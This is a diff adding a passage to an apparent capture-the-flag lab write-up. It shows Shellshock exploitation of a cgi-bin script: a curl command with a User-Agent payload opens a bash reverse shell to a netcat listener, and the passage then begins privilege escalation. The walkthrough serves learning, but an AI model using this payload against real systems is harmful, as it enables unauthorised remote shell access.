@@ -199,6 +199,34 @@ cool stuff hehe. Lets go ahead and get a reverse shell
 
 As you can see from the above screenshot the command ```id``` and ```whoami``` works. So, we can leverage this to  get our reverse shell
 
+command:```curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.86.99/443 0>&1' http://192.168.86.150/cgi-bin/test```
+
+Ensure you change the $lhost to your machine's IP. 
+
+Setting up our netcat listener
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/617eab9c-6794-42ef-b336-e82a5c66630f)
+
+Running the above command;
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/db00ab86-3806-44c1-89b7-f92fc64d2bc2)
+
+Nice, we got a shell as user "_www-data_".
+
+Lets go ahead and escalate our privileges.
+
+
+
+
+# Privilege Escalation
+
+Checking the version of Linux running on the box
+
+command:```cat /etc/issue```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/edec7b73-6e7d-47e4-a715-2159d71063b6)
+
+Lets go ahead and look for available exploits
 
 
 
